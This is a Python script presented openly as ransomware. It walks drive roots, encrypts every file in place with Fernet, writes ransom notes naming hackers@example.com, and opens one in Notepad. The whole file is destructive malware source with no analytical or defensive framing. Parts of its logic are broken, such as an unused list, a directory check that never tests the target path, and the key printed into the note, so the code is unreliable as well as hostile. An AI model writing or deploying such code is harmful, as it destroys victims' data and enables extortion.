import os  # To access file systems  
import subprocess 
from cryptography.fernet import Fernet 

def create_ransomware():   
    rands = ["C:\Windows\System32"] + [str(i) for i in range (10)]      
    #Creating a list of folders to be encrypted  
    encryptedFolders=["c:\\","d:\\","e:\\", "f:\\" ,  "g:\\ ","h:\\" ] #list of folders with path separated by \    
                        
    def encrypt_folders(path):   
        for i in range (10):  
            if os.path.isdir(os.path.join("c:" + str(i))):      
                print ("Encrypting Folder: " + path[len('C:\\'):]) #print the encrypted folder name 
                key = Fernet.generate_key() # Generate a new key for each folder
                with open(os.path.join(path, "README.txt"), 'w') as f:
                    f.write("Your files have been encrypted. To decrypt them, send us an email at hackers@example.com and include your key:\n" + str(key))
                for dirpath, dirnames, filenames in os.walk(path):
                    for filename in filenames:
                        with open(os.path.join(dirpath, filename), 'rb') as f:
                            plaintext = f.read()
                        cipher = Fernet(key).encrypt(plaintext)
                        with open(os.path.join(dirpath, filename), 'wb') as f:
                            f.write(cipher)
                        
    for path in encryptedFolders:
        encrypt_folders(path)
    
    # Create the ransom note 
    ransom_note() 
        
def ransom_note(): 
    """This function creates the ransom note that will be displayed to victims. It should include a greeting, instructions on how to pay the bitcoin wall and an expiration date for when payment must be made."""  
    
    # Create the text of our ransomware 
    victim_message = "You have been infected with RANSOMWARE! All your files are encrypted. To decrypt them, please send us an email at hackers@example.com and include your key."
    
    # Write the ransom note to the Desktop
    with open(os.path.join(os.path.expanduser("~"), "Desktop", "RANSOM_NOTE.txt"), 'w') as f:
        f.write(victim_message)
    
    # Open the ransom note for the victim to see
    subprocess.call(["notepad.exe", os.path.join(os.path.expanduser("~"), "Desktop", "RANSOM_NOTE.txt")])
                        
def main():   
    create_ransomware()
                        
if __name__ == '__main__':   
    main()
